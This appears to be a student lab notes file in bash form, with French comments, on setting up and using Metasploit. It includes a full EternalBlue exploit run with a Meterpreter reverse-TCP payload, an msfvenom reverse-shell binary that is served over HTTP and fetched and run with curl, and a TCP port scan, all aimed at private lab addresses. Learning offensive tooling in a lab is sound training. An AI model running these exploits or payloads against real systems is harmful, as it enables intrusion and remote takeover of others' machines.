#!/bin/bash

#Part 1: Setup Metasploit Locally with PostgreSQL

# 1. Install PostgreSQL: Install PostgreSQL and its dependencies on your Ubuntu system.
sudo apt update
sudo apt install -y postgresql postgresql-contrib metasploit-framework
# Installe PostgreSQL (serveur de base de données)
# Installe postgresql-contrib` (outils complémentaires), ainsi que `metasploit-framework
# -y : répond « oui » automatiquement à toutes les questions d'installation.

# 2.Start PostgreSQL Service: Start the PostgreSQL service to ensure the database is operational.
sudo systemctl enable --now postgresql
# Active le service PostgreSQL pour qu’il démarre automatiquement et le lance immédiatement (`--now`).
# Vérification (optionnelle) : `sudo systemctl status postgresql` pour voir l'état du service.

# 3 - Create PostgreSQL User: Create a dedicated PostgreSQL user specifically for Metasploit.
sudo -u postgres createuser --superuser benbet
# Crée un utilisateur PostgreSQL nommé `benbet`.
# --superuser` donne les privilèges de superutilisateur.

# 4 - Create PostgreSQL Database: Set up a PostgreSQL database that Metasploit will use to store its data.
sudo -u postgres createdb -O benbet baseholberton
# Crée une base de données nommée baseholberton
# -O benbet définit benbet comme propriétaire de cette base (permissions).

# 5 - Initialize Metasploit Database: Initialize the Metasploit database to prepare it for use.
msfdb init

# 6 - Verify Database Connection: Start the Metasploit console and verify the connection to the PostgreSQL database.
msfconsole
# Dans la console Metasploit, tapez la commande suivante pour vérifier l'état de la base de données :
msf > db_status

# commandes complémentaires PostgreSQL utiles :
sudo -u postgres psql
# pour se connecter à postgres
\l
# sous postgres=# donne la liste des BdD et les utilisateurs/propriétaires
\du
# donne les privilèges des utilisateurs

## ---------- Part 2: Metasploit Basic Usage ----------



# 1. Start the Metasploit Console: Access the Metasploit console to begin interacting with its features.
msfconsole -q
#lance metasploit mode silencieux (-q)

# 2. Search for Exploits: Learn how to search for available exploits within Metasploit’s extensive database.
search name:linux type:exploit
# recherche des exploits pour Linux ex : search:ms17_010

# 3 - Select an Exploit: Choose a specific exploit from the search results to prepare for exploitation.
use exploit/windows/smb/ms17_010_eternalblue
# Charge le module d'exploitation EternalBlue pour SMB Windows

# 4 - Set Exploit Options: Configure the necessary options for the selected exploit before execution.
set SRVHOST 192.168.60.3
# Définit l'adresse IP de l'interface d'écoute
set RHOSTS 192.168.60.4
# Définit l'adresse IP de la cible


# 5 - Set Payload: Define the payload that will be delivered to the target system during exploitation.
set PAYLOAD windows/x64/meterpreter/reverse_tcp
# Sélectionne la payload Meterpreter 64 bits en reverse TCP

# 6 - Set Local Host and Port: Specify the local host and port where Metasploit will listen for incoming connections.
set LPORT 4444
# Définit le port d'écoute pour la session reverse
set LHOST 192.168.60.3
# Définit l'adresse IP locale pour le reverse TCP

# 7 - Run the Exploit: Execute the configured exploit to attempt exploitation on the target system.
exploit
# Lance l'exploit
notes -a -t exploit -n "EternalBlue exploit executed against 192.168.60.4"


## ----------Part 3: Payload Creation ----------

# 1. Generate a Payload: Use Metasploit’s msfvenom tool to create a custom payload with specific characteristics.
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.60.3 LPORT=4444 -f elf > payload.elf
# Génère un payload Meterpreter Linux en reverse TCP

# 2. Payload Specifications: Specify parameters such as payload type, local host, local port, output format, and output file name. payload.elf
chmod +x payload.elf
# Rend le fichier exécutable

# 3. Execute the Payload: Validate the generated payload and understand how it can be executed on Ubuntu systems.
python3 -m http.server 8080 &
# Démarre un serveur HTTP simple pour héberger le payload
curl http://192.168.60.3:8080/payload.elf -o /tmp/payload.elf
chmod +x /tmp/payload.elf
/tmp/payload.elf
# Téléchargez le payload sur la machine Linux cible
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.60.3
set LPORT 4444 
exploit
# Configure et lance un handler pour capturer la session Meterpreter

./payload.elf
# Exécute le payload sur la machine cible

notes -a -t result -n "Payload executed on target Linux system 192.168.60.4"
loot -a -t binary -f ./payload.elf -i "générer payload Linux x86 reverse TCP"
# Ajoute une note et sauvegarde le payload généré comme loot
# Le payload peut être utilisé pour des tests ultérieurs


# ---------- Part 4: Auxiliary Module ----------

# 1. Start the Metasploit Console: Access the Metasploit console to begin exploring auxiliary modules.
msfconsole -q
# Lance Metasploit en mode silencieux (-q)

# 2. Search for Auxiliary Modules: Discover and explore available auxiliary modules designed for various tasks.
search type:auxiliary name:portscan
# Recherche des modules auxiliaires liés au scan de ports

# 3. Select an Auxiliary Module: Choose a specific auxiliary module, such as auxiliary/scanner/portscan/tcp, for scanning purposes.
use auxiliary/scanner/portscan/tcp
# Charge le module de scan de ports TCP

# 4. Configure Module Options: Set the required options for the selected auxiliary module, such as specifying the target hosts (RHOSTS).
set RHOSTS 192.168.60.4
# Définit l'adresse IP de la cible

# 5. Execute the Module: Run the configured auxiliary module to perform its designated task, such as conducting a TCP port scan.
exploit
# Exécute le module auxiliaire
notes -a -t auxiliary -n "TCP port scan executed against 192.168.60.4"


# ---------- Part 5: Documentation and Reporting ----------
notes -o report -t final -n "Metasploit Workflow Report"
# Génère un rapport final intitulé "Metasploit Workflow Report" à partir des notes prises durant la session Metasploit.
# Le rapport est sauvegardé avec le type "final" et le nom "Metasploit Workflow Report".
